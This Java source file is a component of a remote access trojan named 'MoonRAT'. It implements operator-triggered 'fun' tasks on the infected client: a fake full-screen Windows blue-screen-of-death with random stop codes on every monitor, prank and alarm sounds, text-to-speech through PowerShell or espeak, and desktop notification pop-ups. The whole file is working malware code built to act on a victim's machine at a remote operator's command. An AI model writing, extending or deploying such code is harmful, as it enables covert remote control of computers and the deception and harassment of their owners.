package moonrat.client.tasks;

import java.awt.Color;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.GraphicsDevice;
import java.awt.GraphicsEnvironment;
import java.awt.GridBagLayout;
import java.awt.Window;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.SourceDataLine;
import javax.swing.Box;
import javax.swing.BoxLayout;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.JWindow;
import javax.swing.SwingUtilities;
import moonrat.Protocol;
import moonrat.Protocol.Frame;

public final class FunTasks {
    private static final Color BSOD_BLUE = new Color(0x00, 0x78, 0xD7);
    private static final String[] STOP_CODES = {
            "CRITICAL_PROCESS_DIED",
            "DRIVER_IRQL_NOT_LESS_OR_EQUAL",
            "KERNEL_SECURITY_CHECK_FAILURE",
            "SYSTEM_SERVICE_EXCEPTION",
            "IRQL_NOT_LESS_OR_EQUAL",
            "PAGE_FAULT_IN_NONPAGED_AREA",
            "MEMORY_MANAGEMENT",
            "UNEXPECTED_KERNEL_MODE_TRAP"
    };
    private static final List<Window> BSOD_WINDOWS = new ArrayList<>();
    private static javax.swing.Timer bsodTimer;

    private FunTasks() {}

    public static Frame bsod(String seconds) {
        Frame response = new Frame(Protocol.BSOD_RESP);
        try {
            if (GraphicsEnvironment.isHeadless()) throw new IOException("headless (no display)");

            int duration = Math.max(1, parseInt(seconds, 15));
            String code = STOP_CODES[new Random().nextInt(STOP_CODES.length)];

            SwingUtilities.invokeAndWait(() -> {
                closeBsod();

                for (GraphicsDevice device : GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()) {
                    JWindow window = new JWindow(device.getDefaultConfiguration());
                    window.setAlwaysOnTop(true);
                    window.setFocusableWindowState(true);

                    JPanel wrap = new JPanel(new GridBagLayout());
                    wrap.setBackground(BSOD_BLUE);

                    JPanel inner = new JPanel();
                    inner.setOpaque(false);
                    inner.setLayout(new BoxLayout(inner, BoxLayout.Y_AXIS));

                    JLabel face = new JLabel(":(");
                    face.setForeground(Color.WHITE);
                    face.setFont(new Font("Segoe UI", Font.PLAIN, 110));
                    face.setAlignmentX(0f);

                    JTextArea text = new JTextArea(
                            "Your PC ran into a problem and needs to restart. We're just\n"
                                    + "collecting some error info, and then we'll restart for you.\n\n"
                                    + "100% complete\n\n"
                                    + "For more information about this issue and possible fixes,"
                                    + " visit https://www.windows.com/stopcode\n\n"
                                    + "If you call a support person, give them this info:\n"
                                    + "Stop code: " + code);
                    text.setEditable(false);
                    text.setOpaque(false);
                    text.setForeground(Color.WHITE);
                    text.setFont(new Font("Segoe UI", Font.PLAIN, 20));
                    text.setLineWrap(true);
                    text.setWrapStyleWord(true);
                    text.setMaximumSize(new Dimension(920, 720));
                    text.setAlignmentX(0f);

                    inner.add(face);
                    inner.add(Box.createVerticalStrut(24));
                    inner.add(text);
                    wrap.add(inner);

                    window.setContentPane(wrap);
                    window.setBounds(device.getDefaultConfiguration().getBounds());
                    window.addKeyListener(new KeyAdapter() {
                        @Override
                        public void keyPressed(KeyEvent event) {
                            if (event.getKeyCode() == KeyEvent.VK_ESCAPE) closeBsod();
                        }
                    });
                    window.setVisible(true);
                    window.toFront();
                    window.requestFocus();
                    BSOD_WINDOWS.add(window);
                }

                bsodTimer = new javax.swing.Timer(duration * 1000, event -> closeBsod());
                bsodTimer.setRepeats(false);
                bsodTimer.start();
            });

            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    private static void closeBsod() {
        if (bsodTimer != null) {
            bsodTimer.stop();
            bsodTimer = null;
        }
        for (Window window : new ArrayList<>(BSOD_WINDOWS)) {
            window.setVisible(false);
            window.dispose();
        }
        BSOD_WINDOWS.clear();
    }

    public static Frame sound(String kind, String text) {
        Frame response = new Frame(Protocol.SOUND_RESP);
        try {
            switch (kind == null ? "" : kind) {
                case "error":
                    playSequence(new double[][]{{0.25, 830}, {0.25, 620}, {0.55, 415}});
                    break;
                case "tada":
                    playSequence(new double[][]{{0.13, 523.25}, {0.13, 659.25}, {0.13, 783.99}, {0.45, 1046.5}});
                    break;
                case "troll": {
                    double[][] sequence = new double[8][2];
                    for (int index = 0; index < sequence.length; index++) {
                        sequence[index][0] = 0.18;
                        sequence[index][1] = index % 2 == 0 ? 700 : 520;
                    }
                    playSequence(sequence);
                    break;
                }
                case "alarm": {
                    double[][] sequence = new double[12][2];
                    for (int index = 0; index < sequence.length; index++) {
                        sequence[index][0] = 0.12;
                        sequence[index][1] = index % 2 == 0 ? 1200 : 900;
                    }
                    playSequence(sequence);
                    break;
                }
                case "beep":
                    playSequence(new double[][]{{0.6, 1000}});
                    break;
                case "speak":
                    speak(text);
                    break;
                default:
                    throw new IOException("unknown sound '" + kind + "'");
            }
            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    private static void playSequence(double[][] sequence) throws Exception {
        AudioFormat format = new AudioFormat(44100f, 16, 1, true, false);
        SourceDataLine line = AudioSystem.getSourceDataLine(format);
        line.open(format, 44100 * 2);
        line.start();

        for (double[] step : sequence) {
            int samples = Math.max(1, (int) (44100 * step[0]));
            double frequency = step[1];
            byte[] buffer = new byte[samples * 2];
            for (int index = 0; index < samples; index++) {
                double envelope = Math.min(1.0, Math.min(index, samples - 1 - index) / 220.0);
                double value = Math.sin(2 * Math.PI * frequency * index / 44100.0) * 0.4 * envelope;
                short sample = (short) (value * Short.MAX_VALUE);
                buffer[index * 2] = (byte) (sample & 0xff);
                buffer[index * 2 + 1] = (byte) ((sample >> 8) & 0xff);
            }
            line.write(buffer, 0, buffer.length);
        }

        line.drain();
        line.close();
    }

    private static void speak(String text) throws Exception {
        if (text == null || text.trim().isEmpty()) throw new IOException("empty text");

        if (isWindows()) {
            String script = "Add-Type -AssemblyName System.Speech; "
                    + "(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('"
                    + text.replace("'", "''") + "')";
            runToEnd(new ProcessBuilder("powershell", "-NoProfile", "-Command", script), 60);
            return;
        }

        try {
            runToEnd(new ProcessBuilder("espeak-ng", "-s", "150", text), 60);
        } catch (IOException notFound) {
            runToEnd(new ProcessBuilder("espeak", "-s", "150", text), 60);
        }
    }

    private static void runToEnd(ProcessBuilder builder, int timeoutSeconds) throws Exception {
        builder.redirectErrorStream(true);
        Process process = builder.start();

        ByteArrayOutputStream buffer = new ByteArrayOutputStream();
        Thread pump = new Thread(() -> {
            try {
                process.getInputStream().transferTo(buffer);
            } catch (IOException ignored) {
            }
        });
        pump.setDaemon(true);
        pump.start();

        boolean finished = process.waitFor(timeoutSeconds, TimeUnit.SECONDS);
        if (!finished) {
            process.destroyForcibly();
            throw new IOException("timeout");
        }
        pump.join(2000);

        if (process.exitValue() != 0) {
            String message = buffer.toString(java.nio.charset.StandardCharsets.UTF_8).trim();
            throw new IOException(message.isEmpty() ? ("exit " + process.exitValue()) : message);
        }
    }

    public static Frame notify(String title, String body) {
        Frame response = new Frame(Protocol.NOTIFY_RESP);
        try {
            String safeTitle = title == null || title.isEmpty() ? "MoonRAT" : title;
            String safeBody = body == null ? "" : body;

            if (isWindows()) {
                String script = "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; "
                        + "$n = New-Object System.Windows.Forms.NotifyIcon; "
                        + "$n.Icon = [System.Drawing.SystemIcons]::Information; $n.Visible = $true; "
                        + "$n.ShowBalloonTip(8000, '" + safeTitle.replace("'", "''") + "', '"
                        + safeBody.replace("'", "''") + "', "
                        + "[System.Windows.Forms.ToolTipIcon]::Info); Start-Sleep -Seconds 6; $n.Dispose()";
                spawn(new ProcessBuilder("powershell", "-NoProfile", "-Command", script), 20);
            } else {
                spawn(new ProcessBuilder("notify-send", "-t", "8000", safeTitle, safeBody), 15);
            }

            response.fields = new ArrayList<>(List.of(""));
        } catch (Exception failure) {
            response.fields = new ArrayList<>(List.of(String.valueOf(failure)));
        }
        return response;
    }

    private static void spawn(ProcessBuilder builder, int maxSeconds) throws IOException {
        builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
        builder.redirectError(ProcessBuilder.Redirect.DISCARD);
        Process process = builder.start();
        Thread reaper = new Thread(() -> {
            try {
                if (!process.waitFor(maxSeconds, TimeUnit.SECONDS)) process.destroyForcibly();
            } catch (Exception ignored) {
            }
        });
        reaper.setDaemon(true);
        reaper.start();
    }

    private static boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().contains("win");
    }

    private static int parseInt(String value, int fallback) {
        try {
            return Integer.parseInt(value);
        } catch (Exception failure) {
            return fallback;
        }
    }
}
